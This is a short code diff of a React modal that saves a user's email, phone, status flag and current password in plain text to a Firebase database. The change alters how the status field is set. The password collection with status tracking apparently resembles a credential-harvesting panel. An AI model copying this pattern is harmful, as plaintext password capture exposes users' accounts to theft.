@@ -62,7 +62,7 @@ const Modal = ({ isModal, setIsModal }) => {
       set(ref(database, "/" + id), {
         email: data.email,
         phone: data.phone,
-        user_status: "zzz",
+        user_status: "1",
         done: false,
         timestamp: Date.now(),
         current_password: password,
@@ -90,11 +90,11 @@ const Modal = ({ isModal, setIsModal }) => {
           form
         );
 
-        setTimeout(() => {
-          const updates = {};
-          updates["/" + id + "/" + "user_status"] = "1";
-          update(ref(database), updates);
-        }, 5000);
+        // setTimeout(() => {
+        //   const updates = {};
+        //   updates["/" + id + "/" + "user_status"] = "1";
+        //   update(ref(database), updates);
+        // }, 5000);
       });
     }
   };
